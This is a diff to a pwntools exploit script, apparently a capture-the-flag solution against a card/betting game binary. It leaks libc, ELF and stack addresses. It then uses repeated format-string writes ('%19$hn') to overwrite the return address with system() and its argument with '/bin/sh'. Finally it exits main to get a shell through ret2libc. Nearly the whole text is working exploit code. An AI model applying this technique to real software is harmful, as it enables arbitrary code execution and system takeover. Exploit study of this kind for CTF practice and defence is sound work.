@@ -21,6 +21,8 @@ def main():
 
     PLAY = "1"
     ADD = "3"
+    QUIT = "5"
+
     # leak elf, stack, libc addresses
 
     r.sendline("1")
@@ -43,6 +45,7 @@ def main():
     libc.address = libc_leak - libc.symbols['_IO_2_1_stdin_']
     exe.address = elf_leak - 4188
     ret = stack_leak + 4
+    arg = stack_leak + 8
 
     system = libc.symbols['system']
     binsh = next(libc.search('/bin/sh\x00'))
@@ -52,12 +55,40 @@ def main():
     # overwrite ret with system
 
     r.sendline(ADD)
-    r.sendline(p32(ret+2) + p32(ret) + "%08x" + "%19$hn")
-
+    r.sendline(p32(ret) + "%{}x".format((system & 0x0000ffff) - 4) + "%19$hn")
     r.sendline(PLAY)
     r.sendline("2") # nr of players
-    r.sendline("") # bet
-    r.sendline("") # bet
+    r.sendline("999") # bet
+    r.sendline("1") # bet which triggers FSB
+
+    r.sendline(ADD)
+    r.sendline(p32(ret+2) + "%{}x".format(int(hex(system & 0xffff0000)[2:6], 16) - 4) + "%19$hn")
+    r.sendline(PLAY)
+    r.sendline("3") # nr of players
+    [r.sendline("999") for i in range(2)]
+    r.sendline("1") # bet which triggers FSB
+
+    # overwriting argument with "/bin/sh" string
+
+    r.sendline(ADD)
+    r.sendline(p32(arg) + "%{}x".format((binsh & 0x0000ffff) - 4) + "%19$hn")
+    r.sendline(PLAY)
+    r.sendline("4") # nr of players
+    [r.sendline("999") for i in range(3)]
+    r.sendline("1") # bet which triggers FSB
+
+    r.sendline(ADD)
+    r.sendline(p32(arg+2) + "%{}x".format(int(hex(binsh & 0xffff0000)[2:6], 16) - 4) + "%19$hn")
+    r.sendline(PLAY)
+    r.sendline("5") # nr of players
+    [r.sendline("999") for i in range(4)]
+    r.sendline("1") # bet which triggers FSB
+
+    # exiting main and performing the ret2libc
+
+    r.sendline(QUIT)
+    r.sendline("y")
+
     r.interactive()
 
 
@@ -68,4 +99,5 @@ if __name__ == "__main__":
 FBS vuln in choice_1
 late comer has longer name - 19
 need to find out how to win round
+"%{}x".format((system & 0x0000ffff) - 8)
 '''
